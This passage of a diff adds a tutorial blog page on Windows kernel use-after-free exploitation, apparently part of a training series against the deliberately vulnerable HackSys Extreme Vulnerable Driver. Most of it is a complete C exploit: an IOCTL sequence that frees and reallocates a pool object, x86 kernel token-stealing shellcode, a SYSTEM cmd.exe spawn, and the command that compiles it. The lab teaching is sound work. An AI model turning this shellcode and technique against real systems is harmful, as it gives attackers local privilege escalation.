+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate evil buffer (userland)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating PUSE_AFTER_FREE_NON_PAGED_POOL object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, HEVD_ALLOCATE_ROBJ, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Freeing object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, HEVD_FREE, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating FAKE_OBJECT_NON_PAGED_POOL</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, HEVD_ALLOCATE_FOBJ, evilBuffer, <span style="color:#66d9ef">sizeof</span>(FAKE_OBJECT_NON_PAGED_POOL));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering UAF</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, HEVD_CALL_FPTR, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Once sent, we can see we have successfully hijacked execution flow.</p>
+<p><img src="/0x02-Introduction-to-Windows-Kernel-Use-After-Frees/uaf_success.png" alt="alt text"></p>
+<p>Now since we see <strong>41414141</strong> we can assume that the first 4 bytes are the function pointer, we can confirm this based on the source code (UseAfterFreeNonPagedPool.h):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">62</span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _USE_AFTER_FREE_NON_PAGED_POOL
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">63</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">64</span>     FunctionPointer Callback;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">65</span>     CHAR Buffer[<span style="color:#ae81ff">0x54</span>];
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">66</span> } USE_AFTER_FREE_NON_PAGED_POOL, <span style="color:#f92672">*</span>PUSE_AFTER_FREE_NON_PAGED_POOL;
+</span></span></code></pre></div><p>Let&rsquo;s write our exploit!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEVD_ALLOCATE_ROBJ IOCTL(0x804)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEVD_CALL_FPTR     IOCTL(0x805)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEVD_FREE          IOCTL(0x806)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define HEVD_ALLOCATE_FOBJ IOCTL(0x807)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _FAKE_OBJECT_NON_PAGED_POOL
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  CHAR Buffer[<span style="color:#ae81ff">0x58</span>];
+</span></span><span style="display:flex;"><span>} FAKE_OBJECT_NON_PAGED_POOL, <span style="color:#f92672">*</span>PFAKE_OBJECT_NON_PAGED_POOL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* sendIoctl:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Send the IOCTL code to the driver */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sendIoctl</span>(HANDLE hHEVD, DWORD dIoctl, CHAR <span style="color:#f92672">*</span>pBuffer, DWORD dBuffer)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD bytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Calling IOCTL Code 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, dIoctl);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  dIoctl,
+</span></span><span style="display:flex;"><span>                  pBuffer,
+</span></span><span style="display:flex;"><span>                  dBuffer,
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>bytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* allocate_buffer:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Creates a userland allocation with the first 4 bytes pointing to the address where our shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     was allocated. */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">allocate_buffer</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>shellcode_addr)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(FAKE_OBJECT_NON_PAGED_POOL));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (buffer <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Shellcode located at: %p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>shellcode_addr);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(buffer, <span style="color:#f92672">&amp;</span>shellcode_addr, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buffer<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>, <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#ae81ff">83</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> buffer;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>evilBuffer <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// sickle -a x86 -p windows/x86/kernel_token_stealer -f c -m pinpoint
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x60</span><span style="color:#e6db74">&#34;</span>                         <span style="color:#75715e">// pushal 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// xor eax, eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x64\x8b\x80\x24\x01\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// mov eax, dword ptr fs:[eax + 0x124]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x40\x50</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov eax, dword ptr [eax + 0x50]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\xc1</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// mov ecx, eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xba\x04\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>         <span style="color:#75715e">// mov edx, 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x80\xb8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>     <span style="color:#75715e">// mov eax, dword ptr [eax + 0xb8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2d\xb8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>         <span style="color:#75715e">// sub eax, 0xb8
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\x90\xb4\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>     <span style="color:#75715e">// cmp dword ptr [eax + 0xb4], edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xed</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// jne 0x1014
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x90\xf8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>     <span style="color:#75715e">// mov edx, dword ptr [eax + 0xf8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\x91\xf8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>     <span style="color:#75715e">// mov dword ptr [ecx + 0xf8], edx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x61</span><span style="color:#e6db74">&#34;</span>                         <span style="color:#75715e">// popal
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// return to userland code
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// xor eax,eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xC3</span><span style="color:#e6db74">&#34;</span>;                        <span style="color:#75715e">// ret
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  LPVOID lpPayload <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL,
+</span></span><span style="display:flex;"><span>                                  <span style="color:#ae81ff">56</span>,
+</span></span><span style="display:flex;"><span>                                  (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                                  PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpPayload <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to create shellcode allocation</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(lpPayload, shellcode, <span style="color:#ae81ff">56</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  evilBuffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">allocate_buffer</span>(lpPayload);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (evilBuffer <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate evil buffer (userland)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating PUSE_AFTER_FREE_NON_PAGED_POOL object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, HEVD_ALLOCATE_ROBJ, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Freeing object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, HEVD_FREE, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating FAKE_OBJECT_NON_PAGED_POOL</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, HEVD_ALLOCATE_FOBJ, evilBuffer, <span style="color:#66d9ef">sizeof</span>(FAKE_OBJECT_NON_PAGED_POOL));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering UAF</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sendIoctl</span>(hHEVD, HEVD_CALL_FPTR, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Enjoy the shell :)</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Once compiled:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>i686<span style="color:#f92672">-</span>w64<span style="color:#f92672">-</span>mingw32<span style="color:#f92672">-</span>gcc poc.c <span style="color:#f92672">-</span>o poc.exe
+</span></span></code></pre></div><p>We get our shell!</p>
+<p><img src="/0x02-Introduction-to-Windows-Kernel-Use-After-Frees/poc.gif" alt="alt text"></p>
+<h1 id="sources">Sources</h1>
+<pre tabindex="0"><code>https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/paged_code
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
